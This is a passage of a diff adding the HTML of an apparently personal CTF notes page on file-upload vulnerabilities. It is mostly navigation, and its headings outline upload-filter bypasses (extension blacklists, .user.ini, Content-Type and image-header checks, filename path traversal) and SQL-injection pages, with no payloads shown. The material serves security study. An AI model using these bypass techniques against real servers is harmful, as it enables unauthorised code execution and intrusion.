@@ -1,0 +1,4697 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Web 安全知识点整理 + 靶场 Writeup">
+      
+      
+        <meta name="author" content="guang">
+      
+      
+        <link rel="canonical" href="https://guang12-c.github.io/ctf-notes/knowledge/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%93%E9%A2%98/">
+      
+      
+        <link rel="prev" href="../">
+      
+      
+        <link rel="next" href="../../rce/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>文件上传专题 - guang's CTF Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+SC:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Sans SC";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/css/bg-video.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="guang&#39;s CTF Notes" class="md-header__button md-logo" aria-label="guang's CTF Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 1 3 3 3 3 0 0 1-3 3 3 3 0 0 1-3-3 3 3 0 0 1 3-3m5.86 10.31C16.23 21.22 14.28 22.45 12 23c-2.56-.61-4.7-2.07-6.42-4.37C3.86 16.34 3 13.8 3 11V5l9-4 9 4v6c0 2.39-.64 4.61-1.92 6.67l-2.91-2.91c.52-.79.83-1.76.83-2.76a5 5 0 0 0-5-5 5 5 0 0 0-5 5 5 5 0 0 0 5 5c1 0 1.97-.31 2.76-.83z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            guang's CTF Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              文件上传专题
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/guang12-c/ctf-notes" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    guang12-c/ctf-notes
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  知识点
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../blog/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  WP 博客
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../files/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  工具字典
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="guang&#39;s CTF Notes" class="md-nav__button md-logo" aria-label="guang's CTF Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 1 3 3 3 3 0 0 1-3 3 3 3 0 0 1-3-3 3 3 0 0 1 3-3m5.86 10.31C16.23 21.22 14.28 22.45 12 23c-2.56-.61-4.7-2.07-6.42-4.37C3.86 16.34 3 13.8 3 11V5l9-4 9 4v6c0 2.39-.64 4.61-1.92 6.67l-2.91-2.91c.52-.79.83-1.76.83-2.76a5 5 0 0 0-5-5 5 5 0 0 0-5 5 5 5 0 0 0 5 5c1 0 1.97-.31 2.76-.83z"/></svg>
+
+    </a>
+    guang's CTF Notes
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/guang12-c/ctf-notes" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    guang12-c/ctf-notes
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    知识点
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    知识点
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../sql/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL 注入
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SQL 注入
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sql/01-%E5%8E%9F%E7%90%86%E4%B8%8E%E8%AF%86%E5%88%AB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    原理与识别
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sql/02-payload%E9%80%9F%E6%9F%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    payload 速查
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sql/03-%E5%8D%A1%E7%82%B9%E5%A4%8D%E7%9B%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    卡点复盘
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sql/04-%E5%9B%9B%E4%B8%AAlab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    四个 lab 通关记录
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sql/05-%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    盲注脚本
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sql/06-OOB%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OOB 带外注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sql/07-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    报错注入专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../sql/blind_sqli_error_%E9%80%90%E8%A1%8C%E8%AE%B2%E8%A7%A3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    逐行讲解(盲注脚本)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_3" id="__nav_2_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    文件上传
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传专题
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、先建立正确的心理模型
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、上传后怎么找真实路径
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="二、上传后怎么找真实路径">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法 1:上传响应里找
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法 2:看"显示这个文件"的页面源码 ⭐ 最可靠
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法 4:按常见路径试
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、判断"PHP 到底执行了没"
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="三、判断&#34;PHP 到底执行了没&#34;">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        铁证 1:看响应体
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        铁证 2:看响应头 ⭐ 5 秒判断
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-content-length" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        铁证 3:看 Content-Length
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4content-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        铁证 4:Content-Type
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        四、三个变量的绕过
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="四、三个变量的绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        变量 1:后缀被拦
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        黑名单绕过速查表（按「生效条件」排）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        变量 1 的终极解法：不改我的后缀，改服务器的规则
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-userini" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        变量 1 的终极解法（二）：.user.ini
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2content-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        变量 2:Content-Type 被查
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        变量 3:文件内容被查（图片头校验）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#filename" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        五、路径穿越：filename 里的 ../
+      
+    </span>
+  </a>
+  
